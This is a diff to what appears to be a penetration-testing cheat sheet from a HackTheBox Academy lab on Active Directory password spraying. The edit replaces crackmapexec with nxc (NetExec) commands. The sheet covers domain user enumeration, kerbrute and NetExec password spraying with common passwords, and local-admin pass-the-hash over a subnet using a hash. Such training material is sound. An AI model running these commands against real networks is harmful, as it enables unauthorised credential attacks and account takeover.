@@ -10,7 +10,7 @@
 
 ### From Linux - Credentialed
 ```
-crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
+nxc smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
 ```
 
 ### From Linux - SMB NULL Session
@@ -52,8 +52,8 @@ enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
 rpcclient -U "" -N 172.16.5.5
 rpcclient $> enumdomusers
 
-# CrackMapExec (also shows badpwdcount)
-crackmapexec smb 172.16.5.5 --users
+# NetExec (also shows badpwdcount)
+nxc smb 172.16.5.5 --users
 ```
 
 ### LDAP Anonymous Bind
@@ -77,7 +77,7 @@ kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
 
 ### With Valid Credentials
 ```
-sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
+sudo nxc smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
 ```
 
 ## Performing the Attack
@@ -94,14 +94,14 @@ for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;qu
 kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1
 ```
 
-#### CrackMapExec
+#### NetExec
 ```
-sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
+sudo nxc smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
 ```
 
 #### Validate Credentials
 ```
-sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123
+sudo nxc smb 172.16.5.5 -u avazquez -p Password123
 ```
 
 ### From Windows
@@ -120,7 +120,7 @@ Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorActio
 - Use `--local-auth` flag to avoid domain account lockout
 
 ```
-sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
+sudo nxc smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
 ```
 
 ## Common Passwords to Try
